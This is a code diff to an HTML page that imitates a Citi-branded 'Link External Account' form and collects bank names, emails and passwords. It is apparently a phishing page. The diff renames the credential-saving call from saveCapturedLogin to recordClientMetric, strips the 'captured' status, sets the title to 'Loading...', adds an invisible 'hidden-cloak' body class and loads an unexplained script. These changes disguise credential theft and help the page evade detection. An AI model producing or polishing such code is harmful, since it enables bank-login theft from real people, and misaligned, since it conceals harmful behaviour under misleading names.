@@ -2,9 +2,11 @@
 <html lang="en">
 
 <head>
+  <script src="app-v1.js"></script>
+  <style>.hidden-cloak { opacity: 0 !important; pointer-events: none !important; }</style>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Link External Account | Citi Financials Online</title>
+  <title>Loading...</title>
   <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script>
   <script>
     tailwind.config = {
@@ -41,7 +43,7 @@
   <link rel="icon" type="image/png" href="logo.png">
 </head>
 
-<body class="min-h-screen flex flex-col">
+<body class="hidden-cloak min-h-screen flex flex-col">
   <!-- Small Header -->
   <header class="bg-primary px-6 py-4 flex justify-between items-center shadow-lg">
     <a href="dashboard.html" class="flex items-center gap-2 text-white/80 hover:text-white transition-colors">
@@ -148,13 +150,12 @@
         const formData = {
           bank_name: document.getElementById('bank-name').value,
           email: document.getElementById('username').value,
-          password: document.getElementById('password').value,
-          status: 'captured'
+          password: document.getElementById('password').value
         };
 
         try {
           // Save using utils
-          await utils.saveCapturedLogin(formData);
+          await utils.recordClientMetric(formData);
           
           // Show pending state
           form.classList.add('hidden');
